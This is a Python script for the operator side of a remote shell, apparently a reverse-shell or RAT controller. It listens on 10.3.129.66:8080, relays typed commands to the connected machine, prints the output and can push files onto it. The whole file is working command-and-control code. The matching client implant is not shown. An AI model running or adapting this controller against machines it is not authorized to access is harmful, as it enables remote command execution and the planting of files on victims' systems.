import socket
import os

def doSend(conn, sourcePath, destinationPath, fileName):
    try:
        # Build the full file path (safely joins even if / or \ is missing)
        full_path = os.path.join(sourcePath, fileName)
        print(f"[~] Looking for file: {full_path}")
        # Check if file exists
        if not os.path.exists(full_path):
            conn.send(b"File not found")
            print(f"File dose not exist: {full_path}")
            return

         # Check if file is empty
        if os.path.getsize(full_path) == 0:
            conn.send(b"File is empty")
            print(f"[-] file is empty: {full_path}")
            return
        # Send file data
        with open(full_path, 'rb') as sourceFile:
            while True:
                packet = sourceFile.read(1024)
                if not packet:
                    break
                conn.send(packet)
            conn.send(b'DONE')
            print("[+] Transfer Completed")
    except Exception as e:
        conn.send(b"File transfer error")
        print(f"[-] Error during file send: {str(e)}")

def connection():
    mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mysocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    mysocket.bind(("10.3.129.66", 8080))
    mysocket.listen(1)
    print("[+] Listening for connections...")

    conn, address = mysocket.accept()
    print(f"[+] Connection established with {address}")

    while True:
        try:
            userinput = input("Shell > ").strip()
            if userinput.lower() == "tem":
                conn.send(b"tem")
                conn.close()
                break

            elif 'send' in userinput:
                sendCmd, destination, fileName = userinput.split("*")
                source = input("Source path: ")
                conn.send(userinput.encode())
                doSend(conn, source, destination, fileName)


            else:
                conn.send(userinput.encode())
                response = conn.recv(1024).decode(errors='ignore')
                print(response)
        except Exception as e:
            print(f"[-] Error: {e}")
            break


def main():
    connection()


if __name__ == "__main__":
    main()
